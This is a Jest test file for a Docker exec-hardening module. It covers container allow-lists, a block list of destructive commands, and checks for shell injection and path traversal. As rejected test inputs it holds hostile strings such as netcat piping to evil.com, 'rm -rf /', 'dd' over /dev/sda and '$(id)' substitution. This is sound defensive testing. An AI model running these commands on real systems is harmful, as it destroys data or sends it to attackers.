/**
 * Tests for exec.js security hardening
 * Run with: npm test -- exec.security.test.js
 *
 * These tests verify the security controls for container execution:
 * - Container name validation
 * - Command injection prevention
 * - Blocked command filtering
 * - Input sanitization
 * - Timeout enforcement
 */

const {
  execInContainer,
  getRunningContainers,
  shell,
  ALLOWED_CONTAINERS,
  BLOCKED_COMMANDS,
  validateAllowedContainer,
  validateCommand,
  isContainerRunning,
} = require('../lib/exec');

const { DockerSecurityError } = require('../lib/docker');

// Mock chalk to avoid ANSI codes in tests
jest.mock('chalk', () => ({
  red: (str) => str,
  yellow: (str) => str,
  green: (str) => str,
  cyan: (str) => str,
  gray: (str) => str,
  bold: (str) => str,
  blue: (str) => str,
}));

// Mock audit module
jest.mock('../lib/audit', () => ({
  logAudit: jest.fn().mockResolvedValue(true),
  AuditEventType: {
    DOCKER_EXEC: 'DOCKER_EXEC',
  },
}));

// Mock child_process
jest.mock('child_process', () => ({
  spawn: jest.fn(),
}));

const { spawn } = require('child_process');

// =============================================================================
// Helper Functions for Mocking
// =============================================================================

function createMockProcess(exitCode = 0, stdout = '', stderr = '') {
  const mockProcess = {
    stdout: { on: jest.fn() },
    stderr: { on: jest.fn() },
    on: jest.fn(),
    kill: jest.fn(),
  };

  // Simulate stdout data events
  mockProcess.stdout.on.mockImplementation((event, callback) => {
    if (event === 'data' && stdout) {
      callback(Buffer.from(stdout));
    }
  });

  // Simulate stderr data events
  mockProcess.stderr.on.mockImplementation((event, callback) => {
    if (event === 'data' && stderr) {
      callback(Buffer.from(stderr));
    }
  });

  // Simulate close event
  mockProcess.on.mockImplementation((event, callback) => {
    if (event === 'close') {
      setTimeout(() => callback(exitCode), 0);
    }
    if (event === 'error') {
      // Don't call error by default
    }
  });

  return mockProcess;
}

// =============================================================================
// Container Validation Tests
// =============================================================================

describe('validateAllowedContainer', () => {
  test('accepts allowed container names', () => {
    for (const container of ALLOWED_CONTAINERS) {
      expect(() => validateAllowedContainer(container)).not.toThrow();
      // Function returns undefined on success (no throw)
    }
  });

  test('rejects containers not in allowed list', () => {
    const disallowedContainers = [
      'evil-container',
      'other-service',
      'mc-database',
      'my-app',
      '',
    ];

    for (const container of disallowedContainers) {
      expect(() => validateAllowedContainer(container)).toThrow(DockerSecurityError);
    }
  });

  test('error includes allowed containers list', () => {
    try {
      validateAllowedContainer('evil-container');
      fail('Expected DockerSecurityError to be thrown');
    } catch (err) {
      expect(err).toBeInstanceOf(DockerSecurityError);
      expect(err.code).toBe('CONTAINER_NOT_ALLOWED');
      expect(err.details.container).toBe('evil-container');
      expect(err.details.allowed).toEqual(Array.from(ALLOWED_CONTAINERS));
    }
  });

  test('rejects container name with path traversal', () => {
    const traversalAttempts = [
      '../etc/passwd',
      'mc-core/../../../etc',
      'mc-core;rm -rf /',
    ];

    for (const container of traversalAttempts) {
      expect(() => validateAllowedContainer(container)).toThrow(DockerSecurityError);
    }
  });

  test('rejects non-string container names', () => {
    expect(() => validateAllowedContainer(null)).toThrow(DockerSecurityError);
    expect(() => validateAllowedContainer(undefined)).toThrow(DockerSecurityError);
    expect(() => validateAllowedContainer(123)).toThrow(DockerSecurityError);
    expect(() => validateAllowedContainer({})).toThrow(DockerSecurityError);
  });
});

// =============================================================================
// Command Validation Tests
// =============================================================================

describe('validateCommand', () => {
  test('accepts valid commands', () => {
    const validCommands = [
      ['ls'],
      ['ls', '-la'],
      ['ls', '-la', '/app'],
      ['cat', '/etc/passwd'],
      ['ps', 'aux'],
      ['python', '--version'],
      ['node', '--version'],
      ['echo', 'hello world'],
    ];

    for (const cmd of validCommands) {
      expect(() => validateCommand(cmd)).not.toThrow();
      // Function returns undefined on success (no throw)
    }
  });

  test('rejects non-array commands', () => {
    expect(() => validateCommand(null)).toThrow(DockerSecurityError);
    expect(() => validateCommand(undefined)).toThrow(DockerSecurityError);
    expect(() => validateCommand('ls -la')).toThrow(DockerSecurityError);
    expect(() => validateCommand(123)).toThrow(DockerSecurityError);
    expect(() => validateCommand({})).toThrow(DockerSecurityError);
  });

  test('rejects empty command arrays', () => {
    expect(() => validateCommand([])).toThrow(DockerSecurityError);
  });

  test('rejects blocked commands', () => {
    for (const cmd of BLOCKED_COMMANDS) {
      expect(() => validateCommand([cmd])).toThrow(DockerSecurityError);
      expect(() => validateCommand([cmd, '-rf', '/'])).toThrow(DockerSecurityError);
    }
  });

  test('blocked commands error includes command name', () => {
    try {
      validateCommand(['rm', '-rf', '/']);
      fail('Expected DockerSecurityError to be thrown');
    } catch (err) {
      expect(err).toBeInstanceOf(DockerSecurityError);
      expect(err.code).toBe('BLOCKED_COMMAND');
      expect(err.details.command).toBe('rm');
    }
  });

  test('rejects commands exceeding maximum length', () => {
    const longArg = 'a'.repeat(5000);
    expect(() => validateCommand(['echo', longArg])).toThrow(DockerSecurityError);
  });

  test('rejects commands with shell injection characters', () => {
    const injectionAttempts = [
      ['ls', ';', 'rm', '-rf', '/'],
      ['ls', '&&', 'cat', '/etc/passwd'],
      ['ls', '|', 'nc', 'evil.com', '9999'],
      ['ls', '`whoami`'],
      ['ls', '$(id)'],
      ['ls', '${IFS}'],
      ['ls', '<', '/etc/passwd'],
      ['ls', '>', '/etc/passwd'],
      ['ls', 'file;rm -rf /'],
    ];

    for (const cmd of injectionAttempts) {
      expect(() => validateCommand(cmd)).toThrow(DockerSecurityError);
    }
  });

  test('command injection error includes problematic argument', () => {
    try {
      validateCommand(['ls', 'file;rm -rf /']);
      fail('Expected DockerSecurityError to be thrown');
    } catch (err) {
      expect(err).toBeInstanceOf(DockerSecurityError);
      expect(err.code).toBe('COMMAND_INJECTION_ATTEMPT');
      expect(err.details.argument).toBe('file;rm -rf /');
    }
  });

  test('allows safe special characters in arguments', () => {
    const safeCommands = [
      ['echo', 'hello world'],
      ['echo', 'file-name.txt'],
      ['echo', 'file_name.txt'],
      ['echo', 'path/to/file'],
      ['echo', 'file.name.txt'],
    ];

    for (const cmd of safeCommands) {
      expect(() => validateCommand(cmd)).not.toThrow();
    }
  });
});

// =============================================================================
// execInContainer Security Tests
// =============================================================================

describe('execInContainer Security', () => {
  beforeEach(() => {
    spawn.mockClear();
  });

  test('rejects disallowed containers', async () => {
    await expect(execInContainer({
      container: 'evil-container',
      command: ['ls'],
    })).rejects.toThrow(DockerSecurityError);
  });

  test('rejects blocked commands', async () => {
    // Mock isContainerRunning to return true
    spawn.mockImplementation((cmd, args) => {
      if (cmd === 'docker' && args[0] === 'ps') {
        return createMockProcess(0, 'mc-core');
      }
      return createMockProcess(0);
    });

    await expect(execInContainer({
      container: 'mc-core',
      command: ['rm', '-rf', '/'],
    })).rejects.toThrow(DockerSecurityError);
  });

  test('checks if container is running before execution', async () => {
    spawn.mockImplementation((cmd, args) => {
      if (cmd === 'docker' && args[0] === 'ps') {
        return createMockProcess(0, ''); // Container not running
      }
      return createMockProcess(0);
    });

    await expect(execInContainer({
      container: 'mc-core',
      command: ['ls'],
    })).rejects.toThrow(DockerSecurityError);
    await expect(execInContainer({
      container: 'mc-core',
      command: ['ls'],
    })).rejects.toThrow("is not running");
  });

  test('rejects invalid working directory with path traversal', async () => {
    spawn.mockImplementation((cmd, args) => {
      if (cmd === 'docker' && args[0] === 'ps') {
        return createMockProcess(0, 'mc-core');
      }
      return createMockProcess(0);
    });

    await expect(execInContainer({
      container: 'mc-core',
      command: ['ls'],
      workdir: '../../../etc',
    })).rejects.toThrow(DockerSecurityError);
    await expect(execInContainer({
      container: 'mc-core',
      command: ['ls'],
      workdir: '..\\windows\\system32',
    })).rejects.toThrow(DockerSecurityError);
  });

  test('rejects invalid environment variable names', async () => {
    spawn.mockImplementation((cmd, args) => {
      if (cmd === 'docker' && args[0] === 'ps') {
        return createMockProcess(0, 'mc-core');
      }
      return createMockProcess(0);
    });

    const invalidEnvVars = [
      { '123VAR': 'value' },
      { 'VAR-NAME': 'value' },
      { 'VAR NAME': 'value' },
      { 'VAR;NAME': 'value' },
      { '': 'value' },
    ];

    for (const env of invalidEnvVars) {
      await expect(execInContainer({
        container: 'mc-core',
        command: ['ls'],
        env,
      })).rejects.toThrow(DockerSecurityError);
      await expect(execInContainer({
        container: 'mc-core',
        command: ['ls'],
        env,
      })).rejects.toThrow('Invalid environment variable name');
    }
  });

  test('accepts valid environment variable names', async () => {
    spawn.mockImplementation((cmd, args) => {
      if (cmd === 'docker' && args[0] === 'ps') {
        return createMockProcess(0, 'mc-core');
      }
      return createMockProcess(0, '', '');
    });

    const validEnvVars = [
      { VAR: 'value' },
      { VAR_NAME: 'value' },
      { var123: 'value' },
      { _VAR: 'value' },
      { VAR1_VAR2: 'value' },
    ];

    for (const env of validEnvVars) {
      await expect(execInContainer({
        container: 'mc-core',
        command: ['echo', 'test'],
        env,
      })).resolves.toBeDefined();
    }
  });

  test('enforces timeout limits', async () => {
    spawn.mockImplementation((cmd, args) => {
      if (cmd === 'docker' && args[0] === 'ps') {
        return createMockProcess(0, 'mc-core');
      }
      // Return a mock that won't timeout immediately
      const mock = createMockProcess(0, '', '');
      return mock;
    });

    // Should use default timeout when not specified
    await execInContainer({
      container: 'mc-core',
      command: ['echo', 'test'],
    });

    // Verify spawn was called with timeout option
    expect(spawn).toHaveBeenCalled();
    const spawnOptions = spawn.mock.calls[spawn.mock.calls.length - 1][2];
    expect(spawnOptions.timeout).toBeDefined();
    expect(spawnOptions.timeout).toBe(300000); // Default 5 minutes
  });

  test('logs audit event on execution', async () => {
    const { logAudit } = require('../lib/audit');

    spawn.mockImplementation((cmd, args) => {
      if (cmd === 'docker' && args[0] === 'ps') {
        return createMockProcess(0, 'mc-core');
      }
      return createMockProcess(0, '', '');
    });

    await execInContainer({
      container: 'mc-core',
      command: ['ls', '-la'],
      workdir: '/app',
    });

    expect(logAudit).toHaveBeenCalledWith('DOCKER_EXEC', expect.objectContaining({
      container: 'mc-core',
      command: 'ls -la',
      workdir: '/app',
    }));
  });
});

// =============================================================================
// Shell Security Tests
// =============================================================================

describe('shell Security', () => {
  beforeEach(() => {
    spawn.mockClear();
  });

  test('only allows approved shells', async () => {
    spawn.mockImplementation((cmd, args) => {
      if (cmd === 'docker' && args[0] === 'ps') {
        return createMockProcess(0, 'mc-core');
      }
      return createMockProcess(0);
    });

    const allowedShells = ['sh', 'bash', 'ash', 'zsh'];

    for (const shellName of allowedShells) {
      await expect(shell('mc-core', shellName)).resolves.toBeDefined();
    }
  });

  test('rejects disallowed shells', async () => {
    const disallowedShells = [
      'powershell',
      'cmd',
      'python',
      'perl',
      'ruby',
      'node',
      '/bin/sh',
    ];

    for (const shellName of disallowedShells) {
      await expect(shell('mc-core', shellName)).rejects.toThrow(DockerSecurityError);
      await expect(shell('mc-core', shellName)).rejects.toThrow('is not allowed');
    }
  });

  test('shell uses interactive and TTY mode', async () => {
    spawn.mockImplementation((cmd, args) => {
      if (cmd === 'docker' && args[0] === 'ps') {
        return createMockProcess(0, 'mc-core');
      }
      return createMockProcess(0);
    });

    await shell('mc-core', 'bash');

    // Check that spawn was called with interactive stdio
    expect(spawn).toHaveBeenCalled();
    const spawnOptions = spawn.mock.calls[spawn.mock.calls.length - 1][2];
    expect(spawnOptions.stdio).toBe('inherit');
  });
});

// =============================================================================
// Integration Security Tests
// =============================================================================

describe('Integration Security Tests', () => {
  beforeEach(() => {
    spawn.mockClear();
  });

  test('prevents command injection through container name', async () => {
    const injectionAttempts = [
      'mc-core; rm -rf /',
      'mc-core && cat /etc/passwd',
      'mc-core | nc evil.com 9999',
      'mc-core$(id)',
      'mc-core`whoami`',
    ];

    for (const container of injectionAttempts) {
      await expect(execInContainer({
        container,
        command: ['ls'],
      })).rejects.toThrow(DockerSecurityError);
    }
  });

  test('prevents command injection through command arguments', async () => {
    spawn.mockImplementation((cmd, args) => {
      if (cmd === 'docker' && args[0] === 'ps') {
        return createMockProcess(0, 'mc-core');
      }
      return createMockProcess(0);
    });

    const injectionAttempts = [
      ['echo', 'hello; rm -rf /'],
      ['echo', 'hello && cat /etc/passwd'],
      ['echo', 'hello | nc evil.com 9999'],
      ['echo', '$(id)'],
      ['echo', '`whoami`'],
    ];

    for (const command of injectionAttempts) {
      await expect(execInContainer({
        container: 'mc-core',
        command,
      })).rejects.toThrow(DockerSecurityError);
    }
  });

  test('prevents path traversal in workdir', async () => {
    spawn.mockImplementation((cmd, args) => {
      if (cmd === 'docker' && args[0] === 'ps') {
        return createMockProcess(0, 'mc-core');
      }
      return createMockProcess(0);
    });

    const traversalAttempts = [
      '../../../etc',
      '..\\..\\windows\\system32',
      '/app/../../../etc',
      './../../etc',
    ];

    for (const workdir of traversalAttempts) {
      await expect(execInContainer({
        container: 'mc-core',
        command: ['ls'],
        workdir,
      })).rejects.toThrow(DockerSecurityError);
    }
  });

  test('all security errors have proper error codes', () => {
    const tests = [
      {
        fn: () => validateAllowedContainer('evil-container'),
        code: 'CONTAINER_NOT_ALLOWED'
      },
      {
        fn: () => validateCommand([]),
        code: 'INVALID_COMMAND_FORMAT'
      },
      {
        fn: () => validateCommand(['rm', '-rf', '/']),
        code: 'BLOCKED_COMMAND'
      },
      {
        fn: () => validateCommand(['sh', '-c', 'rm -rf /']),
        code: 'BLOCKED_SUBCOMMAND'
      },
      {
        fn: () => validateCommand(['ls', 'file;rm -rf /']),
        code: 'COMMAND_INJECTION_ATTEMPT'
      },
      {
        fn: () => validateCommand(['echo', 'a'.repeat(5000)]),
        code: 'COMMAND_TOO_LONG'
      },
    ];

    for (const test of tests) {
      try {
        test.fn();
        fail(`Expected ${test.code} to be thrown`);
      } catch (err) {
        expect(err.code).toBe(test.code);
      }
    }
  });
});

// =============================================================================
// Shell Command Injection Prevention Tests (NEW in v0.16.1)
// =============================================================================

describe('validateShellCommand', () => {
  const { validateShellCommand, SHELL_INTERPRETERS, SHELL_COMMAND_OPTIONS } = require('../lib/exec');

  test('allows non-shell commands with regular validation', () => {
    expect(() => validateShellCommand(['ls', '-la'])).not.toThrow();
    expect(() => validateShellCommand(['cat', '/etc/passwd'])).not.toThrow();
    expect(() => validateShellCommand(['python', 'script.py'])).not.toThrow();
  });

  test('blocks dangerous characters in non-shell commands', () => {
    expect(() => validateShellCommand(['ls', 'file;rm -rf /'])).toThrow(DockerSecurityError);
    expect(() => validateShellCommand(['echo', 'hello && rm -rf /'])).toThrow(DockerSecurityError);
    expect(() => validateShellCommand(['cat', 'file|sh'])).toThrow(DockerSecurityError);
  });

  test('allows shell without command option', () => {
    expect(() => validateShellCommand(['sh'])).not.toThrow();
    expect(() => validateShellCommand(['bash'])).not.toThrow();
    expect(() => validateShellCommand(['bash', '-e', 'script.sh'])).not.toThrow();
  });

  test('validates shell -c option commands', () => {
    // Safe commands
    expect(() => validateShellCommand(['sh', '-c', 'echo hello'])).not.toThrow();
    expect(() => validateShellCommand(['bash', '-c', 'ls -la'])).not.toThrow();
    expect(() => validateShellCommand(['sh', '--command', 'cat file'])).not.toThrow();
  });

  test('blocks blocked subcommands in shell -c', () => {
    expect(() => validateShellCommand(['sh', '-c', 'rm -rf /'])).toThrow(DockerSecurityError);
    expect(() => validateShellCommand(['bash', '-c', 'dd if=/dev/zero of=/dev/sda'])).toThrow(DockerSecurityError);
    expect(() => validateShellCommand(['sh', '-c', 'mkfs.ext4 /dev/sda1'])).toThrow(DockerSecurityError);
    expect(() => validateShellCommand(['bash', '-c', 'fdisk /dev/sda'])).toThrow(DockerSecurityError);
  });

  test('blocks command chaining in shell -c', () => {
    expect(() => validateShellCommand(['sh', '-c', 'echo hello; rm -rf /'])).toThrow(DockerSecurityError);
    expect(() => validateShellCommand(['bash', '-c', 'echo hello && rm -rf /'])).toThrow(DockerSecurityError);
    expect(() => validateShellCommand(['sh', '-c', 'echo hello || rm -rf /'])).toThrow(DockerSecurityError);
    expect(() => validateShellCommand(['bash', '-c', 'echo hello | rm -rf /'])).toThrow(DockerSecurityError);
  });

  test('blocks command substitution in shell -c', () => {
    expect(() => validateShellCommand(['sh', '-c', 'echo $(rm -rf /)'])).toThrow(DockerSecurityError);
    expect(() => validateShellCommand(['bash', '-c', 'echo `rm -rf /`'])).toThrow(DockerSecurityError);
    expect(() => validateShellCommand(['sh', '-c', 'echo ${VAR}'])).toThrow(DockerSecurityError);
  });

  test('blocks path traversal in shell -c', () => {
    expect(() => validateShellCommand(['sh', '-c', 'cat ../../etc/passwd'])).toThrow(DockerSecurityError);
    expect(() => validateShellCommand(['bash', '-c', 'ls ~/..'])).toThrow(DockerSecurityError);
  });

  test('handles inline -c option format', () => {
    expect(() => validateShellCommand(['sh', "-cecho hello"])).not.toThrow();
    expect(() => validateShellCommand(['sh', "-crm -rf /"])).toThrow(DockerSecurityError);
  });

  test('validates multiple shell command options', () => {
    // Multiple -c options (unusual but should validate each)
    expect(() => validateShellCommand(['bash', '-c', 'echo 1', '-c', 'echo 2'])).not.toThrow();
    expect(() => validateShellCommand(['bash', '-c', 'echo 1', '-c', 'rm -rf /'])).toThrow(DockerSecurityError);
  });
});

describe('validateShellCommandString', () => {
  const { validateShellCommandString } = require('../lib/exec');

  test('allows safe shell command strings', () => {
    expect(() => validateShellCommandString('echo hello')).not.toThrow();
    expect(() => validateShellCommandString('ls -la /app')).not.toThrow();
    expect(() => validateShellCommandString('cat /etc/passwd')).not.toThrow();
    expect(() => validateShellCommandString('python manage.py migrate')).not.toThrow();
  });

  test('blocks blocked subcommands', () => {
    expect(() => validateShellCommandString('rm file')).toThrow(DockerSecurityError);
    expect(() => validateShellCommandString('rm')).toThrow(DockerSecurityError);
    expect(() => validateShellCommandString('dd if=/dev/zero of=/dev/sda')).toThrow(DockerSecurityError);
    expect(() => validateShellCommandString('mkfs -t ext4 /dev/sda')).toThrow(DockerSecurityError);
    expect(() => validateShellCommandString('mkfs.ext4 /dev/sda')).toThrow(DockerSecurityError);
    expect(() => validateShellCommandString('fdisk -l')).toThrow(DockerSecurityError);
  });

  test('blocks command chaining operators', () => {
    expect(() => validateShellCommandString('cmd1; cmd2')).toThrow(DockerSecurityError);
    expect(() => validateShellCommandString('cmd1 && cmd2')).toThrow(DockerSecurityError);
    expect(() => validateShellCommandString('cmd1 || cmd2')).toThrow(DockerSecurityError);
    expect(() => validateShellCommandString('cmd1 | cmd2')).toThrow(DockerSecurityError);
  });

  test('blocks command substitution', () => {
    expect(() => validateShellCommandString('echo $(whoami)')).toThrow(DockerSecurityError);
    expect(() => validateShellCommandString('echo `whoami`')).toThrow(DockerSecurityError);
    expect(() => validateShellCommandString('echo ${USER}')).toThrow(DockerSecurityError);
  });

  test('blocks path traversal patterns', () => {
    expect(() => validateShellCommandString('cat ../file')).toThrow(DockerSecurityError);
    expect(() => validateShellCommandString('ls ../../etc')).toThrow(DockerSecurityError);
    expect(() => validateShellCommandString('cat ~/secret')).toThrow(DockerSecurityError);
  });

  test('handles edge cases', () => {
    expect(() => validateShellCommandString('')).not.toThrow();
    expect(() => validateShellCommandString(null)).not.toThrow();
    expect(() => validateShellCommandString(undefined)).not.toThrow();
  });

  test('is case insensitive for blocked commands', () => {
    expect(() => validateShellCommandString('RM file')).toThrow(DockerSecurityError);
    expect(() => validateShellCommandString('Rm -rf /')).toThrow(DockerSecurityError);
    expect(() => validateShellCommandString('MKFS.EXT4 /dev/sda')).toThrow(DockerSecurityError);
  });
});

describe('checkDangerousCharacters', () => {
  const { checkDangerousCharacters } = require('../lib/exec');

  test('allows safe commands', () => {
    expect(() => checkDangerousCharacters(['ls', '-la'])).not.toThrow();
    expect(() => checkDangerousCharacters(['echo', 'hello world'])).not.toThrow();
    expect(() => checkDangerousCharacters(['cat', 'file.txt'])).not.toThrow();
  });

  test('blocks semicolons', () => {
    expect(() => checkDangerousCharacters(['echo', 'hello; rm -rf /'])).toThrow(DockerSecurityError);
  });

  test('blocks ampersands', () => {
    expect(() => checkDangerousCharacters(['echo', 'hello && rm -rf /'])).toThrow(DockerSecurityError);
  });

  test('blocks pipes', () => {
    expect(() => checkDangerousCharacters(['echo', 'hello | cat'])).toThrow(DockerSecurityError);
  });

  test('blocks backticks', () => {
    expect(() => checkDangerousCharacters(['echo', '`rm -rf /`'])).toThrow(DockerSecurityError);
  });

  test('blocks dollar parentheses', () => {
    expect(() => checkDangerousCharacters(['echo', '$(rm -rf /)'])).toThrow(DockerSecurityError);
  });

  test('blocks redirection', () => {
    expect(() => checkDangerousCharacters(['echo', 'hello > file'])).toThrow(DockerSecurityError);
    expect(() => checkDangerousCharacters(['cat', '< file'])).toThrow(DockerSecurityError);
  });
});

// =============================================================================
// Constants Tests
// =============================================================================

describe('Security Constants', () => {
  test('ALLOWED_CONTAINERS contains expected values', () => {
    expect(ALLOWED_CONTAINERS.has('mc-core')).toBe(true);
    expect(ALLOWED_CONTAINERS.has('mc-backend')).toBe(true);
    expect(ALLOWED_CONTAINERS.has('mc-gateway')).toBe(true);
    expect(ALLOWED_CONTAINERS.has('mc-chroma')).toBe(true);
    expect(ALLOWED_CONTAINERS.has('mc-interface')).toBe(true);
    expect(ALLOWED_CONTAINERS.has('mc-traefik')).toBe(true);
  });

  test('ALLOWED_CONTAINERS does not contain unexpected values', () => {
    expect(ALLOWED_CONTAINERS.has('other-container')).toBe(false);
    expect(ALLOWED_CONTAINERS.has('')).toBe(false);
  });

  test('BLOCKED_COMMANDS contains dangerous commands', () => {
    expect(BLOCKED_COMMANDS.has('rm')).toBe(true);
    expect(BLOCKED_COMMANDS.has('dd')).toBe(true);
    expect(BLOCKED_COMMANDS.has('mkfs')).toBe(true);
    expect(BLOCKED_COMMANDS.has('fdisk')).toBe(true);
    expect(BLOCKED_COMMANDS.has('format')).toBe(true);
    expect(BLOCKED_COMMANDS.has('shred')).toBe(true);
    expect(BLOCKED_COMMANDS.has('wipe')).toBe(true);
    expect(BLOCKED_COMMANDS.has('del')).toBe(true);
  });

  test('BLOCKED_COMMANDS is comprehensive', () => {
    // Ensure we have at least the minimum expected blocked commands
    const minimumBlocked = ['rm', 'dd', 'mkfs', 'fdisk', 'format'];
    for (const cmd of minimumBlocked) {
      expect(BLOCKED_COMMANDS.has(cmd)).toBe(true);
    }
  });

  test('SHELL_INTERPRETERS contains common shells', () => {
    const { SHELL_INTERPRETERS } = require('../lib/exec');
    expect(SHELL_INTERPRETERS.has('sh')).toBe(true);
    expect(SHELL_INTERPRETERS.has('bash')).toBe(true);
    expect(SHELL_INTERPRETERS.has('ash')).toBe(true);
    expect(SHELL_INTERPRETERS.has('zsh')).toBe(true);
    expect(SHELL_INTERPRETERS.has('dash')).toBe(true);
    expect(SHELL_INTERPRETERS.has('ksh')).toBe(true);
    expect(SHELL_INTERPRETERS.has('csh')).toBe(true);
    expect(SHELL_INTERPRETERS.has('tcsh')).toBe(true);
  });

  test('SHELL_COMMAND_OPTIONS contains -c and --command', () => {
    const { SHELL_COMMAND_OPTIONS } = require('../lib/exec');
    expect(SHELL_COMMAND_OPTIONS.has('-c')).toBe(true);
    expect(SHELL_COMMAND_OPTIONS.has('--command')).toBe(true);
  });

  test('BLOCKED_COMMANDS includes filesystem utilities', () => {
    const { BLOCKED_COMMANDS } = require('../lib/exec');
    // Extended filesystem utilities added in v0.16.1
    expect(BLOCKED_COMMANDS.has('mkfs.ext4')).toBe(true);
    expect(BLOCKED_COMMANDS.has('mkfs.ext3')).toBe(true);
    expect(BLOCKED_COMMANDS.has('mkfs.xfs')).toBe(true);
    expect(BLOCKED_COMMANDS.has('mkswap')).toBe(true);
    expect(BLOCKED_COMMANDS.has('parted')).toBe(true);
  });
});

// =============================================================================
// Resource Limits Tests (NEW - Security Hardening)
// =============================================================================

describe('RESOURCE_LIMITS Security Constants', () => {
  const { RESOURCE_LIMITS, DISABLE_RESOURCE_LIMITS_ENV } = require('../lib/exec');

  test('RESOURCE_LIMITS is defined with required properties', () => {
    expect(RESOURCE_LIMITS).toBeDefined();
    expect(typeof RESOURCE_LIMITS).toBe('object');
  });

  test('nproc limits are defined for fork bomb protection', () => {
    expect(RESOURCE_LIMITS.nproc).toBeDefined();
    expect(RESOURCE_LIMITS.nproc.soft).toBe(128);
    expect(RESOURCE_LIMITS.nproc.hard).toBe(256);
    expect(RESOURCE_LIMITS.nproc.description).toContain('fork bomb');
  });

  test('nofile limits are defined', () => {
    expect(RESOURCE_LIMITS.nofile).toBeDefined();
    expect(RESOURCE_LIMITS.nofile.soft).toBe(1024);
    expect(RESOURCE_LIMITS.nofile.hard).toBe(2048);
  });

  test('memory limits are defined for resource exhaustion protection', () => {
    expect(RESOURCE_LIMITS.memory).toBeDefined();
    expect(RESOURCE_LIMITS.memory.soft).toBe(536870912); // 512MB
    expect(RESOURCE_LIMITS.memory.hard).toBe(1073741824); // 1GB
    expect(RESOURCE_LIMITS.memory.description).toContain('memory');
  });

  test('stack limits are defined', () => {
    expect(RESOURCE_LIMITS.stack).toBeDefined();
    expect(RESOURCE_LIMITS.stack.soft).toBe(8388608); // 8MB
    expect(RESOURCE_LIMITS.stack.hard).toBe(16777216); // 16MB
  });

  test('DISABLE_RESOURCE_LIMITS_ENV constant is defined', () => {
    expect(DISABLE_RESOURCE_LIMITS_ENV).toBe('MC_EXEC_NO_RESOURCE_LIMITS');
  });
});

describe('execInContainer Resource Limit Enforcement', () => {
  beforeEach(() => {
    spawn.mockClear();
    delete process.env.MC_EXEC_NO_RESOURCE_LIMITS;
  });

  afterEach(() => {
    delete process.env.MC_EXEC_NO_RESOURCE_LIMITS;
  });

  test('applies resource limits by default', async () => {
    spawn.mockImplementation((cmd, args) => {
      if (cmd === 'docker' && args[0] === 'ps') {
        return createMockProcess(0, 'mc-core');
      }
      return createMockProcess(0, '', '');
    });

    await execInContainer({
      container: 'mc-core',
      command: ['echo', 'test'],
    });

    // Find the docker exec call
    const execCall = spawn.mock.calls.find(call =>
      call[0] === 'docker' && call[1][0] === 'exec'
    );
    expect(execCall).toBeDefined();

    const dockerArgs = execCall[1];

    // Verify ulimit flags are present
    expect(dockerArgs).toContain('--ulimit');
    expect(dockerArgs).toContain('nproc=128:256');
    expect(dockerArgs).toContain('nofile=1024:2048');
    expect(dockerArgs).toContain('stack=8388608:16777216');

    // Verify memory limits are present
    expect(dockerArgs).toContain('--memory');
    expect(dockerArgs).toContain('1073741824');
    expect(dockerArgs).toContain('--memory-swap');
  });

  test('resource limits can be disabled via environment variable', async () => {
    process.env.MC_EXEC_NO_RESOURCE_LIMITS = '1';

    spawn.mockImplementation((cmd, args) => {
      if (cmd === 'docker' && args[0] === 'ps') {
        return createMockProcess(0, 'mc-core');
      }
      return createMockProcess(0, '', '');
    });

    await execInContainer({
      container: 'mc-core',
      command: ['echo', 'test'],
    });

    // Find the docker exec call
    const execCall = spawn.mock.calls.find(call =>
      call[0] === 'docker' && call[1][0] === 'exec'
    );
    expect(execCall).toBeDefined();

    const dockerArgs = execCall[1];

    // Verify resource limit flags are NOT present when disabled
    expect(dockerArgs).not.toContain('--ulimit');
    expect(dockerArgs).not.toContain('--memory');
  });

  test('resource limits are applied with interactive mode', async () => {
    spawn.mockImplementation((cmd, args) => {
      if (cmd === 'docker' && args[0] === 'ps') {
        return createMockProcess(0, 'mc-core');
      }
      return createMockProcess(0);
    });

    await execInContainer({
      container: 'mc-core',
      command: ['sh'],
      interactive: true,
      tty: true,
    });

    const execCall = spawn.mock.calls.find(call =>
      call[0] === 'docker' && call[1][0] === 'exec'
    );

    const dockerArgs = execCall[1];
    expect(dockerArgs).toContain('--ulimit');
    expect(dockerArgs).toContain('nproc=128:256');
  });
});

// =============================================================================
// Resource Limit Violation Detection Tests (NEW)
// =============================================================================

describe('Resource Limit Violation Detection', () => {
  const { analyzeExitCode, detectOOMFromStderr, EXIT_CODES } = require('../lib/exec');

  describe('analyzeExitCode', () => {
    test('returns success for exit code 0', () => {
      const result = analyzeExitCode(0);
      expect(result.exitCode).toBe(0);
      expect(result.isResourceViolation).toBe(false);
      expect(result.violationType).toBeNull();
    });

    test('detects SIGKILL (137) as resource limit violation', () => {
      const result = analyzeExitCode(EXIT_CODES.SIGKILL);
      expect(result.exitCode).toBe(137);
      expect(result.isResourceViolation).toBe(true);
      expect(result.violationType).toBe('RESOURCE_LIMIT');
      expect(result.description).toContain('forcefully killed');
      expect(result.suggestion).toContain('memory');
      expect(result.suggestion).toContain('256');
    });

    test('detects SIGXCPU (152) as CPU limit violation', () => {
      const result = analyzeExitCode(EXIT_CODES.SIGXCPU);
      expect(result.exitCode).toBe(152);
      expect(result.isResourceViolation).toBe(true);
      expect(result.violationType).toBe('CPU_LIMIT');
      expect(result.description).toContain('CPU time limit');
      expect(result.suggestion).toContain('too much CPU');
    });

    test('detects SIGXFSZ (153) as file size limit violation', () => {
      const result = analyzeExitCode(EXIT_CODES.SIGXFSZ);
      expect(result.exitCode).toBe(153);
      expect(result.isResourceViolation).toBe(true);
      expect(result.violationType).toBe('FILE_SIZE_LIMIT');
      expect(result.description).toContain('File size limit');
    });

    test('detects SIGSYS (159) as blocked system call', () => {
      const result = analyzeExitCode(EXIT_CODES.SIGSYS);
      expect(result.exitCode).toBe(159);
      expect(result.isResourceViolation).toBe(true);
      expect(result.violationType).toBe('SYSTEM_CALL_BLOCKED');
      expect(result.description).toContain('Blocked system call');
    });

    test('returns non-violation for generic error codes', () => {
      const result = analyzeExitCode(1);
      expect(result.exitCode).toBe(1);
      expect(result.isResourceViolation).toBe(false);
      expect(result.description).toContain('exited with code 1');
    });

    test('returns non-violation for exit code 2', () => {
      const result = analyzeExitCode(2);
      expect(result.isResourceViolation).toBe(false);
    });
  });

  describe('detectOOMFromStderr', () => {
    test('detects "killed process" message', () => {
      expect(detectOOMFromStderr('Process killed process 1234')).toBe(true);
    });

    test('detects "out of memory" message', () => {
      expect(detectOOMFromStderr('System is out of memory')).toBe(true);
      expect(detectOOMFromStderr('Out of Memory occurred')).toBe(true);
    });

